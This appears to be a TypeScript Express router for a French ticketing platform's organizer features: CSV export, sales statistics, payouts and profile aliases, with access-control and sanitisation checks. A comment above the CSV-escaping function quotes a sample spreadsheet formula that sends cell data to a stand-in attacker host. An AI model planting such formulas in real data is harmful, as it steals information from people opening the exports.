import crypto from "crypto";
import express from "express";
import { supabase } from "../lib/config.js";
import { getDB, saveDB } from "../lib/db.js";
import { requireRole } from "../lib/auth.js";
import { runInBackground } from "../lib/utils.js";
import { sendAdminPayoutRequestEmail } from "../lib/email.js";
import { getDefaultCommissionRate, computeCommissionBreakdown } from "../lib/commission.js";
import { validateOrganizerAlias, MAX_ORGANIZER_BIO_LENGTH } from "../lib/organizerAlias.js";
import { encryptPayoutDetails } from "../lib/payoutEncryption.js";

const router = express.Router();

// Neutralise l'injection de formule dans les exports CSV (=, +, -, @ en tête de cellule) :
// buyer_name/buyer_email viennent de l'acheteur (checkout invité, non restreint), donc un
// nom du type =HYPERLINK("http://attaquant.tld/steal?d="&A1) pourrait s'exécuter dans le
// tableur de l'organisateur qui ouvre l'export. Le préfixe apostrophe force Excel/Sheets à
// traiter la cellule comme du texte littéral plutôt que comme une formule.
function csvSafeCell(value: unknown): string {
  const str = String(value ?? "");
  const sanitized = /^[=+\-@]/.test(str) ? `'${str}` : str;
  return `"${sanitized.replace(/"/g, '""')}"`;
}

// Statistics Endpoint for Organizers
router.get("/api/organizer/export", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const requestedOrganizerId = String(req.query.organizerId || authUser.id || "");

  if (authUser.role !== "admin" && requestedOrganizerId !== authUser.id) {
    return res.status(403).json({ error: "Accès refusé : vous ne pouvez exporter que vos propres événements." });
  }

  try {
    let matchedTickets: any[] = [];
    if (supabase) {
      const { data: organizerEvents, error: eventsError } = await supabase
        .from("events")
        .select("id")
        .eq("organizer_id", requestedOrganizerId);
      if (eventsError) throw eventsError;

      const eventIds = (organizerEvents || []).map((e: any) => e.id);
      if (eventIds.length > 0) {
        const { data: tkts, error: tktsError } = await supabase
          .from("tickets")
          .select("*")
          .in("event_id", eventIds)
          .order("purchase_date", { ascending: false });
        if (tktsError) throw tktsError;
        matchedTickets = tkts || [];
      }
    } else {
      const db = getDB();
      const organizerEvents = db.events.filter((e: any) => e.organizerId === requestedOrganizerId);
      const eventIds = organizerEvents.map((e: any) => e.id);
      matchedTickets = db.tickets.filter((t: any) => eventIds.includes(t.eventId));
    }

    // Generate CSV
    const header = [
      "ID Transaction",
      "Date d'Achat",
      "Événement",
      "Client",
      "Email Client",
      "Quantité",
      "Catégorie",
      "Prix Payé (XOF)",
      "Statut"
    ].join(",");

    const rows = matchedTickets.map((t: any) => [
      t.transaction_ref || t.transactionRef || "",
      t.purchase_date || t.purchaseDate || "",
      csvSafeCell(t.event_title || t.eventTitle || ""),
      csvSafeCell(t.buyer_name || t.buyerName || ""),
      csvSafeCell(t.buyer_email || t.buyerEmail || ""),
      t.quantity || 1,
      t.tier || "standard",
      t.price_paid || t.pricePaid || 0,
      t.payment_status || t.paymentStatus || "paid"
    ].join(","));

    const csvData = [header, ...rows].join("\n");
    res.setHeader("Content-Type", "text/csv; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="clicbillet_export_${Date.now()}.csv"`);
    res.status(200).send(csvData);
  } catch (err: any) {
    console.error("Export error", err);
    res.status(500).json({ error: "Erreur lors de l'exportation." });
  }
});

router.get("/api/organizer/stats", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const { organizerId } = req.query;

  if (!organizerId) {
    return res.status(400).json({ error: "organizerId requis." });
  }

  // Anti-IDOR : un organisateur ne peut consulter que ses propres statistiques
  // (chiffre d'affaires, ventes, emails clients), pas celles d'un confrère.
  if (authUser.role !== "admin" && String(organizerId) !== authUser.id) {
    return res.status(403).json({ error: "Accès refusé : ressource d'un autre organisateur." });
  }

  if (supabase) {
    try {
      // 1. Get organizer events
      const { data: organizerEvents, error: eventsError } = await supabase
        .from("events")
        .select("*")
        .eq("organizer_id", organizerId);

      if (eventsError) throw eventsError;

      const eventIds = (organizerEvents || []).map((e: any) => e.id);

      // 2. Get tickets for those events
      let matchedTickets: any[] = [];
      if (eventIds.length > 0) {
        const { data: tkts, error: tktsError } = await supabase
          .from("tickets")
          .select("*")
          .in("event_id", eventIds)
          .order("purchase_date", { ascending: false });

        if (tktsError) throw tktsError;
        matchedTickets = tkts || [];
      }

      const defaultCommissionRate = await getDefaultCommissionRate();
      const eventCommissionRateById = new Map((organizerEvents || []).map((e: any) => [e.id, e.commission_rate != null ? Number(e.commission_rate) : null]));
      const { totalGrossRevenue, totalCommission, totalRevenue, effectiveCommissionRate: commissionRate } = computeCommissionBreakdown(matchedTickets, eventCommissionRateById, defaultCommissionRate);

      const ticketsSold = matchedTickets.reduce((sum: number, t: any) => sum + Number(t.quantity || 1), 0);
      const activeEvents = (organizerEvents || []).length;

      const recentSales = matchedTickets.slice(0, 10).map((t: any) => ({
        eventTitle: t.event_title,
        buyerName: t.buyer_name,
        amount: Number(t.price_paid),
        date: t.purchase_date,
        tier: t.tier
      }));

      const tickets = matchedTickets.map((t: any) => ({
        id: t.id,
        eventId: t.event_id,
        eventTitle: t.event_title,
        buyerName: t.buyer_name,
        buyerEmail: t.buyer_email,
        tier: t.tier,
        pricePaid: Number(t.price_paid),
        scanned: t.scanned,
        scannedAt: t.scanned_at,
        transactionRef: t.transaction_ref,
        purchaseDate: t.purchase_date,
        quantity: t.quantity
      }));

      return res.json({
        totalRevenue,
        totalGrossRevenue,
        totalCommission,
        commissionRate,
        ticketsSold,
        activeEvents,
        recentSales,
        tickets
      });
    } catch (err: any) {
      console.error("[Supabase Error] Organizer statistics, falling back to local file DB:", err.message);
    }
  }

  const db = getDB();
  
  // Repli db.json : mêmes données que la branche Supabase ci-dessus, filtrées sur les
  // événements de cet organisateur.
  const organizerEvents = db.events.filter((e: any) => e.organizerId === organizerId);
  const eventIds = organizerEvents.map((e: any) => e.id);

  const matchedTickets = db.tickets.filter((t: any) => eventIds.includes(t.eventId));

  const defaultCommissionRate = await getDefaultCommissionRate();
  const eventCommissionRateById = new Map<string, number | null>(organizerEvents.map((e: any) => [e.id, e.commissionRate != null ? Number(e.commissionRate) : null]));
  const { totalGrossRevenue, totalCommission, totalRevenue, effectiveCommissionRate: commissionRate } = computeCommissionBreakdown(matchedTickets, eventCommissionRateById, defaultCommissionRate);

  const ticketsSold = matchedTickets.reduce((sum: number, t: any) => sum + t.quantity, 0);
  const activeEvents = organizerEvents.length;

  const recentSales = matchedTickets.slice(0, 10).map((t: any) => ({
    eventTitle: t.eventTitle,
    buyerName: t.buyerName,
    amount: t.pricePaid,
    date: t.purchaseDate,
    tier: t.tier
  }));

  res.json({
    totalRevenue, // Net Balance
    totalGrossRevenue, // Gross 100%
    totalCommission, // 10% platform share
    commissionRate,
    ticketsSold,
    activeEvents,
    recentSales,
    tickets: matchedTickets
  });
});

// --- Payouts (Demandes de retrait) ---

const PAYOUT_METHODS = new Set(["orange_money", "mtn_momo", "moov_money", "wave", "bank_transfer"]);

// Solde net réellement disponible pour un organisateur : revenu net cumulé (déjà calculé
// pour /api/organizer/stats) moins les retraits déjà demandés (en attente ou payés) — pour
// empêcher qu'une demande de retrait dépasse ce que l'organisateur a effectivement gagné.
async function getOrganizerAvailableBalance(organizerId: string): Promise<number> {
  if (!supabase) return 0; // db.json : pas de contrôle de solde en dev local (voir limitation documentée)

  const { data: organizerEvents } = await supabase
    .from("events")
    .select("id, commission_rate")
    .eq("organizer_id", organizerId);
  const eventIds = (organizerEvents || []).map((e: any) => e.id);

  let matchedTickets: any[] = [];
  if (eventIds.length > 0) {
    const { data: tkts } = await supabase.from("tickets").select("price_paid, event_id").in("event_id", eventIds);
    matchedTickets = tkts || [];
  }

  const defaultRate = await getDefaultCommissionRate();
  const rateById = new Map((organizerEvents || []).map((e: any) => [e.id, e.commission_rate != null ? Number(e.commission_rate) : null]));
  const { totalRevenue } = computeCommissionBreakdown(matchedTickets, rateById, defaultRate);

  const { data: existingPayouts } = await supabase
    .from("payouts")
    .select("amount")
    .eq("organizer_id", organizerId)
    .in("status", ["paid", "pending"]);
  const alreadyRequested = (existingPayouts || []).reduce((sum: number, p: any) => sum + Number(p.amount || 0), 0);

  return totalRevenue - alreadyRequested;
}

router.post("/api/organizer/payouts", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const { amount, method, details } = req.body;
  const numericAmount = Number(amount);
  if (!Number.isFinite(numericAmount) || numericAmount <= 0 || !PAYOUT_METHODS.has(String(method))) {
    return res.status(400).json({ error: "Montant ou méthode de retrait invalide." });
  }
  if (typeof details !== "string" || !details.trim() || details.length > 500) {
    return res.status(400).json({ error: "Détails du compte de réception invalides." });
  }

  // Anti-IDOR : un organisateur ne peut poser une demande de retrait que pour lui-même.
  const requestedOrganizerId = String(req.body.organizerId || authUser.id || "");
  if (authUser.role !== "admin" && requestedOrganizerId !== authUser.id) {
    return res.status(403).json({ error: "Accès refusé : ressource d'un autre organisateur." });
  }
  const organizerId = requestedOrganizerId;

  // Contrôle de solde réel (Supabase uniquement) : en repli db.json (dev local), il n'existe
  // pas de calcul de solde fiable équivalent, donc on n'applique pas ce contrôle plutôt que de
  // bloquer systématiquement toute demande de retrait en développement.
  const availableBalance = await getOrganizerAvailableBalance(organizerId);
  if (supabase && numericAmount > availableBalance) {
    return res.status(400).json({ error: "Le montant demandé dépasse votre solde disponible." });
  }

  // Coordonnées de retrait (numéro mobile money / IBAN) chiffrées avant toute écriture
  // (Supabase ou db.json) : une donnée financière sensible qui ne doit jamais être lisible en
  // clair au repos, y compris via un accès direct à la base contournant l'application.
  const payout = {
    id: `pay-${crypto.randomUUID()}`, organizerId, amount: numericAmount, status: "pending" as const,
    requestDate: new Date().toISOString(), method, details: encryptPayoutDetails(details)
  };

  if (supabase) {
    try {
      const { error } = await supabase.from("payouts").insert({
        id: payout.id, organizer_id: payout.organizerId, amount: payout.amount,
        status: payout.status, request_date: payout.requestDate, method: payout.method, details: payout.details
      });
      if (error) throw error;
    } catch(e: any) {
       console.warn("[Supabase Error] Payout insert, falling back to local file DB:", e.message);
    }
  }
  const db = getDB();
  db.payouts = db.payouts || [];
  db.payouts.unshift(payout as any);
  saveDB(db);

  try {
    let organizerName = db.users.find((u: any) => u.id === organizerId)?.name;
    if (!organizerName && supabase) {
      const { data: organizerUser } = await supabase.from("users").select("name").eq("id", organizerId).maybeSingle();
      organizerName = organizerUser?.name;
    }
    runInBackground(sendAdminPayoutRequestEmail(organizerName || organizerId, payout));
  } catch (e: any) {
    console.warn("[Email] Notification admin (demande de retrait) échouée :", e.message);
  }

  res.json({ success: true, payout });
});

router.get("/api/organizer/payouts", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const { organizerId } = req.query;

  // Anti-IDOR : un organisateur ne peut consulter que ses propres demandes de retrait
  // (qui contiennent des coordonnées bancaires/mobile money sensibles).
  if (authUser.role !== "admin" && String(organizerId) !== authUser.id) {
    return res.status(403).json({ error: "Accès refusé : ressource d'un autre organisateur." });
  }

  if (supabase) {
    try {
      const { data, error } = await supabase.from("payouts").select("*").eq("organizer_id", organizerId);
      if (error) throw error;
      return res.json((data || []).map((p: any) => ({...p, organizerId: p.organizer_id, requestDate: p.request_date})));
    } catch(e: any) {
      console.warn("[Supabase Error] Fetching payouts, falling back to local file DB:", e.message);
    }
  }
  const db = getDB();
  res.json((db.payouts || []).filter(p => p.organizerId === organizerId || (p as any).organizer_id === organizerId));
});

// --- Page publique organisateur (alias + bio) ---

router.get("/api/organizer/profile", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from("users")
        .select("organizer_alias, organizer_bio")
        .eq("id", authUser.id)
        .maybeSingle();
      if (error) throw error;
      return res.json({ alias: data?.organizer_alias || null, bio: data?.organizer_bio || null });
    } catch (err: any) {
      console.error("[Supabase Error] Reading organizer profile:", err.message);
    }
  }

  const db = getDB();
  const dbUser = db.users.find((u: any) => u.id === authUser.id) as any;
  res.json({ alias: dbUser?.organizerAlias || null, bio: dbUser?.organizerBio || null });
});

router.get("/api/organizer/check-alias", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const result = validateOrganizerAlias(String(req.query.alias || ""));
  if (!result.valid) {
    return res.json({ available: false, error: result.error });
  }

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from("users")
        .select("id")
        .ilike("organizer_alias", result.alias)
        .neq("id", authUser.id)
        .maybeSingle();
      if (error) throw error;
      return res.json({ available: !data, alias: result.alias });
    } catch (err: any) {
      console.error("[Supabase Error] Checking organizer alias:", err.message);
      return res.status(500).json({ error: "Vérification impossible pour le moment." });
    }
  }

  const db = getDB();
  const taken = db.users.some((u: any) =>
    u.id !== authUser.id && String(u.organizerAlias || "").toLowerCase() === result.alias
  );
  res.json({ available: !taken, alias: result.alias });
});

router.patch("/api/organizer/profile", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
  const authUser = (req as any).user;
  const { alias, bio } = req.body;

  const result = validateOrganizerAlias(String(alias || ""));
  if (!result.valid) {
    return res.status(400).json({ error: result.error });
  }

  const trimmedBio = String(bio || "").trim().slice(0, MAX_ORGANIZER_BIO_LENGTH);

  if (supabase) {
    try {
      const { data: existing, error: checkError } = await supabase
        .from("users")
        .select("id")
        .ilike("organizer_alias", result.alias)
        .neq("id", authUser.id)
        .maybeSingle();
      if (checkError) throw checkError;
      if (existing) {
        return res.status(409).json({ error: "Cet alias est déjà pris." });
      }

      const { error: updateError } = await supabase
        .from("users")
        .update({ organizer_alias: result.alias, organizer_bio: trimmedBio })
        .eq("id", authUser.id);
      if (updateError) {
        // Contrainte unique Postgres (users_organizer_alias_unique) : rattrape la course entre
        // la vérification ci-dessus et cet UPDATE (deux organisateurs choisissant le même alias
        // au même moment) avec le message attendu plutôt qu'une erreur 500 générique.
        if ((updateError as any).code === "23505") {
          return res.status(409).json({ error: "Cet alias est déjà pris." });
        }
        throw updateError;
      }

      return res.json({ success: true, alias: result.alias, bio: trimmedBio });
    } catch (err: any) {
      console.error("[Supabase Error] Updating organizer profile:", err.message);
      return res.status(500).json({ error: "Échec de la mise à jour du profil." });
    }
  }

  const db = getDB();
  const taken = db.users.some((u: any) =>
    u.id !== authUser.id && String(u.organizerAlias || "").toLowerCase() === result.alias
  );
  if (taken) {
    return res.status(409).json({ error: "Cet alias est déjà pris." });
  }
  const dbUser = db.users.find((u: any) => u.id === authUser.id) as any;
  if (!dbUser) {
    return res.status(404).json({ error: "Utilisateur introuvable." });
  }
  dbUser.organizerAlias = result.alias;
  dbUser.organizerBio = trimmedBio;
  saveDB(db);

  res.json({ success: true, alias: result.alias, bio: trimmedBio });
});

export default router;

